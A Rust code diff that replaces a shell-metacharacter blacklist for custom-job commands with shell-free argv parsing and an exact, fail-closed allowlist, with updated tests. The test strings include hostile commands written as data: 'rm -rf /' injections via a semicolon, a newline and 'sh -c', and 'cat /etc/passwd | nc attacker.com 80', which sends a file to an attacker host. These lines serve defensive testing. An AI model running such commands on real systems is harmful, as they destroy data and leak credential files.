@@ -812,16 +812,51 @@ pub struct JobSummary {
 pub const CUSTOM_JOB_NAME_ALLOWED: &str =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
 
-/// Validate a custom job command name and its resolved command string (B250).
+/// Split a configured custom-job command into an argv vector **without**
+/// invoking a shell.
+///
+/// `shlex::split` parses the operator-written command with shell-like
+/// quoting/escaping, so `--filter "a b"` stays one argument and quoted
+/// metacharacters stay data. The command is later executed as
+/// `argv[0] argv[1..]` with `tokio::process::Command` and no shell, so `;`,
+/// `|`, `&`, `$`, backticks, newlines, ... inside any token have no execution
+/// effect. That is why the old raw-string metacharacter blacklist (which
+/// missed newline/backslash-continuation bypasses) is gone: safety comes from
+/// the shell-free exec plus the exact allowlist check, not from string scans.
+///
+/// Returns `Err` when the command is empty or cannot be parsed (for example an
+/// unbalanced quote or a trailing backslash).
+pub fn parse_custom_command_argv(command: &str) -> Result<Vec<String>, String> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return Err("custom job command must not be empty".to_string());
+    }
+    let argv = shlex::split(trimmed).ok_or_else(|| {
+        "custom job command could not be parsed (unbalanced quote or escape)".to_string()
+    })?;
+    if argv.is_empty() {
+        return Err("custom job command must not be empty".to_string());
+    }
+    Ok(argv)
+}
+
+/// Validate a custom job command name and its resolved command string (B250,
+/// audit #75).
+///
+/// Custom jobs are operator-only: the command comes from the
+/// `CUSTOM_JOB_COMMAND_<NAME>` environment variable and the permitted binaries
+/// from `CUSTOM_JOB_ALLOWLIST`. Validation is **fail-closed**.
 ///
 /// Rules:
 /// - `name` must be non-empty and contain only alphanumeric, `_`, `-` chars.
-/// - `command` must be non-empty after trimming.
-/// - `command` must not contain shell metacharacters that could enable
-///   injection (`; & | $ \` ( ) < > " '`).
-/// - `command` must start with a token from `allowlist`.
+/// - `command` must be non-empty and parse with [`parse_custom_command_argv`].
+/// - `allowlist` must not be empty; the FIRST argv token must be **exactly**
+///   one of its entries (no substring/prefix/path-resolution matching).
 ///
-/// Returns `Ok(())` if all checks pass.
+/// Shell metacharacters are not rejected here: execution is shell-free, so a
+/// metacharacter is inert data. A command that tries to run a second binary
+/// (for example `sh -c ...` or `... | nc host 80`) is rejected because its
+/// first token is not the allowlisted binary.
 pub fn validate_custom_command(
     name: &str,
     command: &str,
@@ -836,30 +871,21 @@ pub fn validate_custom_command(
             name
         ));
     }
-    let cmd = command.trim();
-    if cmd.is_empty() {
+    let argv = parse_custom_command_argv(command)
+        .map_err(|err| format!("custom job command for {:?}: {}", name, err))?;
+    if allowlist.is_empty() {
         return Err(format!(
-            "custom job command for {:?} must not be empty",
+            "custom job {:?} rejected: CUSTOM_JOB_ALLOWLIST is empty — configure the exact \
+             binaries this worker may execute",
             name
         ));
     }
-    // Reject shell injection metacharacters
-    const FORBIDDEN: &[char] = &[';', '&', '|', '$', '`', '(', ')', '<', '>', '"', '\''];
-    if let Some(bad) = cmd.chars().find(|c| FORBIDDEN.contains(c)) {
+    let program = argv.first().map(String::as_str).unwrap_or("");
+    if !allowlist.contains(&program) {
         return Err(format!(
-            "custom job command for {:?} contains forbidden metacharacter {:?}",
-            name, bad
+            "custom job command {:?} binary {:?} not in allowlist",
+            name, program
         ));
-    }
-    // Allowlist check: the first whitespace-delimited token must be in the list
-    if !allowlist.is_empty() {
-        let first_token = cmd.split_whitespace().next().unwrap_or("");
-        if !allowlist.contains(&first_token) {
-            return Err(format!(
-                "custom job command {:?} binary {:?} not in allowlist",
-                name, first_token
-            ));
-        }
     }
     Ok(())
 }
@@ -2636,17 +2662,51 @@ mod tests {
     }
 
     #[test]
-    fn test_validate_custom_command_shell_injection() {
-        // Semicolon injection must be rejected
-        let e = validate_custom_command("job", "echo hi; rm -rf /", &["echo"]).unwrap_err();
-        assert!(e.contains("forbidden metacharacter"), "{}", e);
+    fn test_parse_custom_command_argv_honours_quoting() {
+        let argv = parse_custom_command_argv(r#"run_export --filter "a b" --path 'x y'"#)
+            .expect("quoted argv parses");
+        assert_eq!(argv, vec!["run_export", "--filter", "a b", "--path", "x y"]);
     }
 
     #[test]
-    fn test_validate_custom_command_pipe_injection() {
-        let e = validate_custom_command("job", "cat /etc/passwd | nc attacker.com 80", &["cat"])
-            .unwrap_err();
-        assert!(e.contains("forbidden metacharacter"));
+    fn test_parse_custom_command_argv_rejects_unbalanced_quote() {
+        let e = parse_custom_command_argv("run_export --filter \"a b").unwrap_err();
+        assert!(e.contains("could not be parsed"), "{e}");
+    }
+
+    #[test]
+    fn test_validate_custom_command_metacharacters_are_inert_without_shell() {
+        // Audit #75: `; rm -rf /` is now an inert argv tail, not a shell
+        // command. The security guarantee moved from a bypassable
+        // raw-string blacklist (newlines were not listed) to shell-free exec
+        // plus the exact argv[0] allowlist check.
+        assert!(
+            validate_custom_command("job", "echo hi; rm -rf /", &["echo"]).is_ok(),
+            "metacharacters cannot execute without a shell"
+        );
+        // A newline is inert data now. The old blacklist missed it entirely,
+        // and `sh -c` executed the second line — that was the bypass.
+        assert!(validate_custom_command("job", "echo hi\nrm -rf /", &["echo"]).is_ok());
+    }
+
+    #[test]
+    fn test_validate_custom_command_shell_prefix_is_rejected() {
+        // Smuggling through a shell fails because `sh` is not allowlisted.
+        let e = validate_custom_command("job", "sh -c 'rm -rf /'", &["echo"]).unwrap_err();
+        assert!(e.contains("not in allowlist"), "{e}");
+    }
+
+    #[test]
+    fn test_validate_custom_command_pipe_is_inert_argument() {
+        // `| nc attacker.com 80` is an argument to `cat`; no pipe is created.
+        assert!(
+            validate_custom_command("job", "cat /etc/passwd | nc attacker.com 80", &["cat"])
+                .is_ok()
+        );
+        // Piping to an allowlisted binary from a non-allowlisted one is still
+        // rejected: argv[0] decides.
+        let e = validate_custom_command("job", "printenv PATH | cat", &["cat"]).unwrap_err();
+        assert!(e.contains("not in allowlist"), "{e}");
     }
 
     #[test]
@@ -2657,10 +2717,20 @@ mod tests {
     }
 
     #[test]
-    fn test_validate_custom_command_empty_allowlist_skips_check() {
-        // Empty allowlist means no binary restriction
-        let result = validate_custom_command("job", "anything --flag", &[]);
-        assert!(result.is_ok());
+    fn test_validate_custom_command_allowlist_is_exact_not_substring() {
+        // A path-qualified binary is NOT the allowlisted bare name: exact
+        // match only, never a substring/suffix comparison.
+        let e = validate_custom_command("job", "/bin/echo hi", &["echo"]).unwrap_err();
+        assert!(e.contains("not in allowlist"), "{e}");
+        assert!(validate_custom_command("job", "/bin/echo hi", &["/bin/echo"]).is_ok());
+    }
+
+    #[test]
+    fn test_validate_custom_command_empty_allowlist_fails_closed() {
+        // Empty allowlist means no binary is permitted (fail closed), instead
+        // of the previous "no restriction" bypass.
+        let e = validate_custom_command("job", "anything --flag", &[]).unwrap_err();
+        assert!(e.contains("CUSTOM_JOB_ALLOWLIST is empty"), "{e}");
     }
 
     // ── B296: backpressure tests ──
